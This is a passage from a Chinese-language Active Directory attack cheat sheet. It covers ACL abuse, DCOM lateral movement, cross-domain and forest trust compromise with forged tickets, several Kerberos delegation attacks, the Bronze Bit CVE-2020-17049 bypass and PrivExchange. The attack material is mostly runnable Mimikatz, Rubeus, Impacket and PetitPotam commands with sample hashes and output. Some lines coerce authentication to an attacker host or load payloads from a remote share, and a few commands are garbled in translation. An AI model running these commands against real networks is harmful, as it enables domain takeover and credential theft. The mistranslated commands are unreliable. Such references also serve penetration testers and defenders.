bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setOwner devil_user1 target_object
```

这个ACE可以被滥用来进行即时的计划任务攻击，或者将用户添加到本地管理员组。

### ReadLAPSPassword

攻击者可以读取此ACE适用的计算机账户的LAPS密码。这可以通过Active Directory PowerShell模块实现。关于利用的细节可以在[阅读LAPS密码](#reading-laps-password)部分找到。

```powershell
Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
```

或者对于特定的计算机

```powershell
bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getObjectAttributes LAPS_PC$ ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```

### ReadGMSAPassword

攻击者可以读取此ACE适用的账户的GMSA密码。这可以通过Active Directory和DSInternals PowerShell模块实现。

```powershell
# 将blob保存到变量中
$gmsa = Get-ADServiceAccount -Identity 'SQL_HQ_Primary' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'

# 使用DSInternals模块解码数据结构
ConvertFrom-ADManagedPasswordBlob $mp
```

或者

```powershell
python bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getObjectAttributes gmsaAccount$ msDS-ManagedPassword
```

### ForceChangePassword

攻击者可以更改此ACE适用的用户的密码：

* 在Windows上，这可以通过`Set-DomainUserPassword`（PowerView模块）实现：

```powershell
$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
```

* Linux:
```bash
# 使用Samba软件套件中的rpcclient
rpcclient -U 'attacker_user%my_password' -W DOMAIN -c "setuserinfo2 target_user 23 target_newpwd" 

# 使用带哈希传递的bloodyAD
bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B changePassword target_user target_newpwd
```

## DCOM利用

> DCOM是COM（组件对象模型）的扩展，允许应用程序在远程计算机上实例化并访问COM对象的属性和方法。

* Impacket DCOMExec.py

  ```ps1
  dcomexec.py [-h] [-share SHARE] [-nooutput] [-ts] [-debug] [-codec CODEC] [-object [{ShellWindows,ShellBrowserWindow,MMC20}]] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-A authfile] [-keytab KEYTAB] target [command ...]
  dcomexec.py -share C$ -object MMC20 '<DOMAIN>/<USERNAME>:<PASSWORD>@<MACHINE_CIBLE>'
  dcomexec.py -share C$ -object MMC20 '<DOMAIN>/<USERNAME>:<PASSWORD>@<MACHINE_CIBLE>' 'ipconfig'
  
  python3 dcomexec.py -object MMC20 -silentcommand -debug $DOMAIN/$USER:$PASSWORD\$@$HOST 'notepad.exe'
  # -object MMC20 指定我们希望实例化MMC20.Application对象。
  # -silentcommand 执行命令而不尝试检索输出。
  ```

* CheeseTools - https://github.com/klezVirus/CheeseTools

  ```powershell
  # https://klezvirus.github.io/RedTeaming/LateralMovement/LateralMovementDCOM/
  -t, --target=VALUE         目标机器
  -b, --binary=VALUE         二进制文件：powershell.exe
  -a, --args=VALUE           参数：-enc <blah>
  -m, --method=VALUE         方法：MMC20Application, ShellWindows,
                              ShellBrowserWindow, ExcelDDE, VisioAddonEx,
                              OutlookShellEx, ExcelXLL, VisioExecLine, 
                              OfficeMacro
  -r, --reg, --registry      启用注册表操作
  -h, -?, --help             显示帮助
  
  当前方法：MMC20.Application, ShellWindows, ShellBrowserWindow, ExcelDDE, VisioAddonEx, OutlookShellEx, ExcelXLL, VisioExecLine, OfficeMacro。
  ```

* Invoke-DCOM - https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Invoke-DCOM.ps1

  ```powershell
  导入模块 .\Invoke-DCOM.ps1
  Invoke-DCOM -ComputerName '10.10.10.10' -Method MMC20.Application -Command "calc.exe"
  Invoke-DCOM -ComputerName '10.10.10.10' -Method ExcelDDE -Command "calc.exe"
  Invoke-DCOM -ComputerName '10.10.10.10' -Method ServiceStart "MyService"
  Invoke-DCOM -ComputerName '10.10.10.10' -Method ShellBrowserWindow -Command "calc.exe"
  Invoke-DCOM -ComputerName '10.10.10.10' -Method ShellWindows -Command "calc.exe"
  ```

### 通过MMC应用程序类DCOM

此COM对象（MMC20.Application）允许您编写MMC管理单元操作的脚本。在**Document.ActiveView**下有一个名为 **"ExecuteShellCommand"** 的方法。

```ps1
PS C:\> $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.1"))
PS C:\> $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe",$null,$null,7)
PS C:\> $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",$null,"-enc DFDFSFSFSFSFSFSFSDFSFSF < Empire编码字符串 > ","7")

# 使用MSBuild的武器化示例
PS C:\> [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.1")).Document.ActiveView.ExecuteShellCommand("c:\windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",$null,"\\10.10.10.2\webdav\build.xml","7")
```

Invoke-MMC20RCE : https://raw.githubusercontent.com/n0tty/powershellery/master/Invoke-MMC20RCE.ps1

### 通过Office DCOM

* Excel.Application
  * DDEInitiate
  * RegisterXLL
* Outlook.Application
  * CreateObject->Shell.Application->ShellExecute
  * CreateObject->ScriptControl (仅office-32bit)
* Visio.InvisibleApp (与Visio.Application相同，但不应显示Visio窗口)
  * Addons
  * ExecuteLine
* Word.Application
  * RunAutoMacro


```ps1
# 通过DCOM将shellcode注入到excel.exe中的Powershell脚本
Invoke-Excel4DCOM64.ps1 https://gist.github.com/Philts/85d0f2f0a1cc901d40bbb5b44eb3b4c9
Invoke-ExShellcode.ps1 https://gist.github.com/Philts/f7c85995c5198e845c70cc51cd4e7e2a

# 使用Excel DDE
PS C:\> $excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "$ComputerName"))
PS C:\> $excel.DisplayAlerts = $false
PS C:\> $excel.DDEInitiate("cmd", "/c calc.exe")

# 使用Excel RegisterXLL
# 与远程目标一起使用不可靠
要求：reg add HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations /v AllowsNetworkLocations /t REG_DWORD /d 1
PS> $excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "$ComputerName"))
PS> $excel.RegisterXLL("EvilXLL.dll")

# 使用Visio
$visio = [activator]::CreateInstance([type]::GetTypeFromProgID("Visio.InvisibleApp", "$ComputerName"))
$visio.Addons.Add("C:\Windows\System32\cmd.exe").Run("/c calc")

```

### 通过ShellExecute DCOM

```ps1
$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"10.10.10.1")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
```

### 通过ShellBrowserWindow DCOM

:warning: 仅Windows 10，该对象在Windows 7中不存在

```ps1
$com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"10.10.10.1")
$obj = [System.Activator]::CreateInstance($com)
$obj.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
```

## 域之间的信任关系

* 单向
  * 域B信任A
  * 域A中的用户可以访问域B的资源
  * 域B中的用户无法访问域A的资源
* 双向
  * 域A信任域B
  * 域B信任域A
  * 认证请求可以在两个域之间双向传递

### 枚举域之间的信任

* 本机`nltest`

  ```powershell
  nltest /trusted_domains
  ```

* PowerShell `GetAllTrustRelationships`

  ```powershell
  ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
  
  SourceName          TargetName                    TrustType      TrustDirection
  ----------          ----------                    ---------      --------------
  domainA.local      domainB.local                  TreeRoot       双向
  ```

* Crackmapexec模块`enum_trusts`

  ```powershell
  cme ldap <ip> -u <user> -p <pass> -M enum_trusts 
  ```

### 利用域之间的信任

:warning: 需要当前域的域管理员级访问权限。

| 来源  | 目标  | 使用的技术                                  | 信任关系                 |
| ----- | ----- | ------------------------------------------- | ------------------------ |
| 根    | 子    | 黄金票据 + 企业管理员组（Mimikatz /groups） | 跨领域（双向）           |
| 子    | 子    | SID历史记录利用（Mimikatz /sids）           | 跨领域父子（双向）       |
| 子    | 根    | SID历史记录利用（Mimikatz /sids）           | 跨领域树根（双向）       |
| 森林A | 森林B | PrinterBug + 无约束委派 ?                   | 跨领域森林或外部（双向） |



## 子域到森林妥协 - SID劫持

大多数树通过双向信任关系链接，以允许资源共享。
默认情况下，如果森林创建的第一个域。

**要求**： 

- KRBTGT哈希
- 找到域的SID

```powershell
$ Convert-NameToSid target.domain.com\krbtgt
S-1-5-21-2941561648-383941485-1389968811-502

# with Impacket
lookupsid.py domain/user:password@10.10.10.10
```



- 将502替换为519以代表企业管理员

- 创建黄金票据并攻击父域。

  ```powershell
  kerberos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:domain.local /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt
  ```

## 林到林妥协 - 信任票据

* 要求：禁用SID过滤

从DC中，使用Mimikatz（例如使用LSADump或DCSync）转储`currentdomain\targetdomain$`信任账户的哈希值。然后，使用这个信任密钥和域SID，使用Mimikatz伪造一个跨领域TGT，将目标域的企业管理员组的SID添加到我们的**SID历史**中。

### 转储信任密码（信任密钥）

> 寻找以美元符号（$）结尾的信任名称。大多数带有尾随**$**的账户是计算机账户，但有些是信任账户。

```powershell
lsadump::trust /patch

或找到TRUST_NAME$计算机账户哈希
```

### 使用Mimikatz创建伪造的信任票据（跨领域TGT）

```powershell
mimikatz(命令行) # kerberos::golden /domain:domain.local /sid:S-1-5-21... /rc4:HASH_TRUST$ /user:Administrator /service:krbtgt /target:external.com /ticket:c:\temp\trust.kirbi
mimikatz(命令行) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\ad\tools\mcorp-ticket.kirbi
```

### 使用信任票据文件获取目标服务的ST

```powershell
.\asktgs.exe c:\temp\trust.kirbi CIFS/machine.domain.local
.\Rubeus.exe asktgs /ticket:c:\ad\tools\mcorp-ticket.kirbi /service:LDAP/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
```

注入ST文件并以伪造的权限访问目标服务。

```powershell
kirbikator lsa .\ticket.kirbi
ls \\machine.domain.local\c$
```

## 特权访问管理（PAM）信任

> PAM（特权访问管理）引入了堡垒森林用于管理，影子安全主体（组映射到受管森林的高特权组）。这些允许管理其他森林而无需更改组或ACL，也无需交互式登录。

要求：

* Windows Server 2016或更早版本

如果我们攻破了堡垒，我们可以在其他域获得`Domain Admins`权限

* PAM信任的默认配置

  ```ps1
  # 在我们的森林上执行
  netdom trust lab.local /domain:bastion.local /ForestTransitive:Yes 
  netdom trust lab.local /domain:bastion.local /EnableSIDHistory:Yes 
  netdom trust lab.local /domain:bastion.local /EnablePIMTrust:Yes 
  netdom trust lab.local /domain:bastion.local /Quarantine:No
  # 在我们的堡垒上执行
  netdom trust bastion.local /domain:lab.local /ForestTransitive:Yes
  ```

* 枚举PAM信任

  ```ps1
  # 检测当前森林是否为PAM信任
  Import ADModule
  Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
  
  # 枚举影子安全主体
  Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
  
  # 枚举当前森林是否由堡垒森林管理
  # Trust_Attribute_PIM_Trust + Trust_Attribute_Treat_As_External
  Get-ADTrust -Filter {(ForestTransitive -eq $True)} 
  ```

* 妥协

  * 使用先前发现的影子安全主体（WinRM账户，RDP访问，SQL等）
  * 使用SID历史

* 持久性

  ```ps1
  # 将受损用户添加到组
  Set-ADObject -Identity "CN=forest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=domain,DC=local" -Add @{'member'="CN=Administrator,CN=Users,DC=domain,DC=local"}
  ```

## Kerberos无约束委派

> 用户发送ST以访问服务，连同他们的TGT，然后服务可以使用用户的TGT请求ST，以便用户访问任何其他服务并模拟用户。 - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html

> 当用户认证到具有不受限制的kerberos委派权限的计算机时，已认证用户的TGT票证会保存到该计算机的内存中。

:warning: 无约束委派曾是Windows 2000中唯一可用的选项

> **警告**
> 如果您想要Kerberos票证，请记住强制转换为HOSTNAME

### 利用无约束委派的SpoolService滥用

目标是使用计算机账户和SpoolService漏洞获得DC同步权限。

**要求**：

- 具有属性**信任此计算机进行委派到任何服务（仅限Kerberos）**的对象
- 必须具有**ADS_UF_TRUSTED_FOR_DELEGATION**
- 不能具有**ADS_UF_NOT_DELEGATED**标志
- 用户不能位于**受保护的用户**组中
- 用户不能具有标志**账户敏感且无法委派**

#### 查找委派

:warning: : 域控制器通常启用了无约束委派。检查`TRUSTED_FOR_DELEGATION`属性。

* [ADModule](https://github.com/samratashok/ADModule)

  ```powershell
  # 来自https://github.com/samratashok/ADModule
  PS> Get-ADComputer -Filter {TrustedForDelegation -eq $True}
  ```

* [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)

  ```powershell
  $> ldapdomaindump -u "DOMAIN\\Account" -p "Password123*" 10.10.10.10   
  grep TRUSTED_FOR_DELEGATION domain_computers.grep
  ```



* [CrackMapExec module](https://github.com/mpgn/CrackMapExec/wiki) 
  ```powershell
  cme ldap 10.10.10.10 -u username -p password --trusted-for-delegation
  ```

  

  ## 利用Unconstrained Delegation实现攻击的步骤与缓解措施

  ### 通过BloodHound查找具有Unconstrained Delegation权限的计算机

  * BloodHound命令：`MATCH (c:Computer {unconstraineddelegation:true}) RETURN c`
  * 使用PowerShell Active Directory模块：`Get-ADComputer -LDAPFilter "(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -Properties DNSHostName,userAccountControl`

  #### 检查远程主机上的SpoolService状态

  检查远程主机上的打印服务是否正在运行。

  ```powershell
  ls \\dc01\pipe\spoolss
  python rpcdump.py DOMAIN/user:password@10.10.10.10
  ```

  #### 使用Rubeus监控连接

  监控来自Rubeus的传入连接。

  ```powershell
  Rubeus.exe monitor /interval:1
  ```

  #### 强制域控制器回连

  由于Unconstrained Delegation的存在，计算机账户（DC$）的票据授权文件（TGT）将被保存在具有Unconstrained Delegation权限的计算机内存中。默认情况下，域控制器计算机账户对域对象具有DCSync权限。

  > SpoolSample是一个PoC工具，用于利用MS-RPRN RPC接口中的“特性”强制Windows主机对任意服务器进行认证。

  ```powershell
  # 从https://github.com/leechristensen/SpoolSample获取
  .\SpoolSample.exe VICTIM-DC-NAME UNCONSTRAINED-SERVER-DC-NAME
  .\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB
  # DC01.HACKER.LAB 是我们想要攻破的域控制器
  # HELPDESK.HACKER.LAB 是我们控制并启用了委派权限的机器。
  
  # 从https://github.com/dirkjanm/krbrelayx获取
  printerbug.py 'domain/username:password'@<VICTIM-DC-NAME> <UNCONSTRAINED-SERVER-DC-NAME>
  
  # 从https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc#gistcomment-2773689获取
  python dementor.py -d domain -u username -p password <UNCONSTRAINED-SERVER-DC-NAME> <VICTIM-DC-NAME>
  ```

  如果攻击成功，你应该获得域控制器的TGT。

  #### 加载票据

  从Rubeus输出中提取Base64编码的TGT，并将其加载到我们当前的会话中。

  ```powershell
  .\Rubeus.exe asktgs /ticket:<ticket base64> /service:LDAP/dc.lab.local,cifs/dc.lab.local /ptt
  ```

  或者你也可以使用Mimikatz来获取票据：`mimikatz # sekurlsa::tickets`

  然后你可以使用DCsync或其他攻击手段：`mimikatz # lsadump::dcsync /user:HACKER\krbtgt`

  #### 缓解措施

  * 确保敏感账户不能被委派
  * 禁用打印服务

  ### 利用Unconstrained Delegation和MS-EFSRPC

  使用`PetitPotam`代替`SpoolSample`，这是另一种强制目标机器回调的工具。

  ```bash
  # 强制回调
  git clone https://github.com/topotam/PetitPotam
  python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
  python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
  
  # 提取票据
  .\Rubeus.exe asktgs /ticket:<ticket base64> /ptt
  ```

  ## Kerberos Constrained Delegation（KCD）

  > Kerberos Constrained Delegation（KCD）是微软Active Directory（AD）中的一个安全特性，允许服务代表用户或服务访问资源时进行身份模拟。

  ### 识别Constrained Delegation

  * BloodHound命令：`MATCH p = (a)-[:AllowedToDelegate]->(c:Computer) RETURN p`

  * PowerView命令：`Get-NetComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto | ft`

  * 原生PowerShell命令

    ```powershell
    Get-DomainComputer -TrustedToAuth | select -exp dnshostname
    Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo
    ```

  ### 利用Constrained Delegation

  * Impacket工具

    ```ps1
    getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
    ```

  * Rubeus工具：S4U2攻击（S4U2self + S4U2proxy）

    ```ps1
    # 使用密码
    Rubeus.exe s4u /nowrap /msdsspn:"time/target.local" /altservice:cifs /impersonateuser:"administrator" /domain:"domain" /user:"user" /password:"password"
    
    # 使用NT哈希
    Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:time/srv01.domain.com /altservice:cifs /ptt
    Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
    dir \\dc.domain.com\c$
    ```

文档：
* Rubeus：使用现有票证执行S4U2攻击以冒充“管理员”

  ```ps1
  # 转储票证
  Rubeus.exe tgtdeleg /nowrap
  Rubeus.exe triage
  Rubeus.exe dump /luid:0x12d1f7
  
  # 创建票证
  Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /ticket:doIFRjCCBUKgAwIBB...BTA== /ptt
  ```

* Rubeus：使用aes256密钥

  ```ps1
  # 获取机器账户的aes256密钥
  privilege::debug
  token::elevate
  sekurlsa::ekeys
  
  # 创建票证
  Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /user:win10x64$ /aes256:4b55f...fd82 /ptt
  ```


### 在资源上冒充域用户

要求：

* 在配置了约束委托的计算机上具有SYSTEM级权限

```ps1
PS> [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
PS> $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
PS> $idToImpersonate.Impersonate()
PS> [System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
PS> ls \\dc01.offense.local\c$
```


## 基于资源的Kerberos约束委托

基于资源的约束委托在Windows Server 2012中引入。

> 用户发送服务票证（ST）访问服务（“服务A”），如果服务被允许委托给另一个预定义的服务（“服务B”），那么服务A可以向认证服务提供用户提供的TGS并获得用于服务B的用户ST。https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html

1. 导入**Powermad**和**Powerview**

   ```powershell
   PowerShell.exe -ExecutionPolicy Bypass
   Import-Module .\powermad.ps1
   Import-Module .\powerview.ps1
   ```

2. 获取用户SID

   ```powershell
   $AttackerSID = Get-DomainUser SvcJoinComputerToDom -Properties objectsid | Select -Expand objectsid
   $ACE = Get-DomainObjectACL dc01-ww2.factory.lan | ?{$_.SecurityIdentifier -match $AttackerSID}
   $ACE
   ConvertFrom-SID $ACE.SecurityIdentifier
   ```

3. 利用**MachineAccountQuota**创建计算机账户并为其设置SPN

   ```powershell
   New-MachineAccount -MachineAccount swktest -Password $(ConvertTo-SecureString 'Weakest123*' -AsPlainText -Force)
   ```

4. 重写DC的**AllowedToActOnBehalfOfOtherIdentity**属性

   ```powershell
   $ComputerSid = Get-DomainComputer swktest -Properties objectsid | Select -Expand objectsid
   $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
   $SDBytes = New-Object byte[] ($SD.BinaryLength)
   $SD.GetBinaryForm($SDBytes, 0)
   Get-DomainComputer dc01-ww2.factory.lan | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
   $RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
   $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
   $Descriptor.DiscretionaryAcl
   ```

   ```ps1
   # 替代方案
   $SID_FROM_PREVIOUS_COMMAND = Get-DomainComputer MACHINE_ACCOUNT_NAME -Properties objectsid | Select -Expand objectsid
   $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID_FROM_PREVIOUS_COMMAND)"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
   
   # 替代方案
   StandIn_Net35.exe --computer dc01 --sid SID_FROM_PREVIOUS_COMMAND
   ```

5. 使用Rubeus从密码获取哈希值

   ```powershell
   Rubeus.exe hash /password:'Weakest123*' /user:swktest$  /domain:factory.lan
   [*] 输入密码             : Weakest123*
   [*] 输入用户名             : swktest$
   [*] 输入域               : factory.lan
   [*] 盐值                       : FACTORY.LANswktest
   [*]       rc4_hmac             : F8E064CA98539B735600714A1F1907DD
   [*]       aes128_cts_hmac_sha1 : D45DEADECB703CFE3774F2AA20DB9498
   [*]       aes256_cts_hmac_sha1 : 0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347
   [*]       des_cbc_md5          : BA297CFD07E62A5E
   ```

6. 使用我们新创建的机器账户冒充域管理员

   ```powershell
   .\Rubeus.exe s4u /user:swktest$ /rc4:F8E064CA98539B735600714A1F1907DD /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap
   .\Rubeus.exe s4u /user:swktest$ /aes256:0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347 /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap
   
   [*] 冒充用户 'Administrator' 以访问目标SPN 'cifs/dc01-ww2.factory.lan'
   [*] 使用域控制器：DC01-WW2.factory.lan (172.16.42.5)
   [*] 为服务构建S4U2proxy请求：'cifs/dc01-ww2.factory.lan'
   [*] 发送S4U2proxy请求
   [+] S4U2proxy成功！
   [*] SPN 'cifs/dc01-ww2.factory.lan' 的base64(ticket.kirbi)：
   
       doIGXDCCBligAwIBBaEDAgEWooIFXDCCBVhhggVUMIIFUKADAgEFoQ0bC0ZBQ1RPUlkuTEFOoicwJaAD
       AgECoR4wHBsEY2lmcxsUZGMwMS[...]PMIIFC6ADAgESoQMCAQOiggT9BIIE
       LmZhY3RvcnkubGFu
   
   [*] 操作：导入票证
   [+] 票证成功导入！
   ```

## Kerberos用户服务扩展

* 允许服务代表另一用户获取TGS的用户服务自我
* 允许服务代表另一用户获取另一服务的TGS的用户服务代理

### S4U2self - 权限提升

1. 获取TGT 

   * 使用无约束委托
   * 使用当前机器账户：`Rubeus.exe tgtdeleg /nowrap`

2. 使用该TGT进行S4U2self请求，以便作为域管理员为机器获取服务票证。

   ```ps1
   Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001.domain.local" /ticket:"base64ticket"
   Rubeus.exe ptt /ticket:"base64ticket"
   
   Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001" /ticket:"base64ticket" /ptt
   ```

“网络服务”账户和AppPool身份可以在Active Directory方面充当计算机账户，它们仅在本地受限制。因此，如果您以这些身份运行并为自己请求任何用户（例如，具有本地管理员权限的用户，如DA）的服务票证，可以调用S4U2self。

```ps1
# 当尝试S4UProxy步骤时，Rubeus执行将失败，但由S4USelf生成的票证将被打印。
Rubeus.exe s4u /user:${computerAccount} /msdsspn:cifs/${computerDNS} /impersonateuser:${localAdmin} /ticket:${TGT} /nowrap
# 服务名称不包含在TGS加密数据中，可以根据意愿进行修改。
Rubeus.exe tgssub /ticket:${ticket} /altservice:cifs/${ServerDNSName} /ptt
```


## Kerberos Bronze Bit攻击 - CVE-2020-17049

> 攻击者可以冒充不允许被委托的用户。这包括**受保护用户**组的成员以及任何其他明确配置为**敏感且不能被委托**的用户。

> 补丁于2020年11月10日发布，DC很可能直到[2021年2月](https://support.microsoft.com/en-us/help/4598347/managing-deployment-of-kerberos-s4u-changes-for-cve-2020-17049)都容易受到攻击。

:warning: 打补丁后的错误消息：`[-] Kerberos SessionError: KRB_AP_ERR_MODIFIED(消息流已修改)`

要求：

* 服务账户的密码哈希
* 具有`约束委托`或`基于资源的约束委托`的服务账户
* [Impacket PR #1013](https://github.com/SecureAuthCorp/impacket/pull/1013) 

**攻击#1** - 绕过`仅信任此用户用于指定服务的委托 - 仅使用Kerberos`保护，并冒充受保护的无法委托的用户。

```powershell
# forwardable标志仅受票证加密保护，该加密使用服务账户的密码
$ getST.py -spn cifs/Service2.test.local -impersonate Administrator -hashes <LM:NTLM hash> -aesKey <AES hash> test.local/Service1 -force-forwardable -dc-ip <Domain controller> # -> Forwardable

$ getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes aad3b435b51404eeaad3b435b51404ee:7c1673f58e7794c77dead3174b58b68f -aesKey 4ffe0c458ef7196e4991229b0e1c4a11129282afb117b02dc2f38f0312fc84b4 test.local/Service1 -force-forwardable

# 加载票证
.\mimikatz\mimikatz.exe "kerberos::ptc User2.ccache" exit

# 访问"c$"
ls \\service2.test.local\c$
```

**攻击#2** - 对AD中的一个或多个对象具有写入权限

```powershell
# 创建新的机器账户
Import-Module .\Powermad\powermad.ps1
New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString 'AttackerServicePassword' -AsPlainText -Force)
.\mimikatz\mimikatz.exe "kerberos::hash /password:AttackerServicePassword /user:AttackerService /domain:test.local" exit

# 设置允许委派给账户的主体
Install-WindowsFeature RSAT-AD-PowerShell
Import-Module ActiveDirectory
Get-ADComputer AttackerService
Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$
Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount

# 执行攻击
python .\impacket\examples\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local/AttackerService -force-forwardableet-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$

# 加载票证
.\mimikatz\mimikatz.exe "kerberos::ptc User2.ccache" exit | Out-Null
```

## PrivExchange攻击

通过滥用Exchange交换您的权限以获得域管理员权限。
:warning: 您需要一个具有邮箱的用户账户的shell。


1. 交换服务器主机名或IP地址

   ```bash 
   pth-net rpc group members "Exchange Servers" -I dc01.domain.local -U domain/username
   ```


2. 中继Exchange服务器身份验证和权限提升（使用Impacket的ntlmrelayx）。

   ```powershell
   ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user username
   ```


3. 订阅推送通知功能（使用privexchange.py或powerPriv），使用当前用户的凭据进行身份验证到Exchange服务器。强制Exchange服务器将其NTLMv2哈希发送回受控机器。

   ```bash
   # https://github.com/dirkjanm/PrivExchange/blob/master/privexchange.py
   python privexchange.py -ah xxxxxxx -u xxxx -d xxxxx
   python privexchange.py -ah 10.0.0.2 mail01.domain.local -d domain.local -u user_exchange -p pass_exchange
   
   # https://github.com/G0ldenGunSec/PowerPriv 
   powerPriv -targetHost corpExch01 -attackerHost 192.168.1.17 -Version 2016
   ```

4. 利用Impacket的秘密转储，用户现在可以执行dcsync并获取另一个用户的NTLM哈希

   ```bash
   python secretsdump.py xxxxxxxxxx -just-dc
   python secretsdump.py lab/buff@192.168.0.2 -ntds ntds -history -just-dc-ntlm
   ```

5. 清理您的混乱并恢复用户ACL的先前状态

   ```powershell
   python aclpwn.py --restore ../aclpwn-20190319-125741.restore
   ```

或者您可以使用Metasploit模块

[`use auxiliary/scanner/http/exchange_web_server_pushsubscription`](https://github.com/rapid7/metasploit-framework/pull/11420)

或者您可以使用一体化工具：Exchange2domain。

```powershell
git clone github.com/Ridter/Exchange2domain 
python Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d domain.com -th DCip MailServerip
python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip --just-dc-user krbtgt MailServerip
```

## SCCM部署

> SCCM是微软提供的一种解决方案，用于在组织中以可扩展的方式增强管理。

* [PowerSCCM - 用于与SCCM部署交互的PowerShell模块](https://github.com/PowerShellMafia/PowerSCCM)
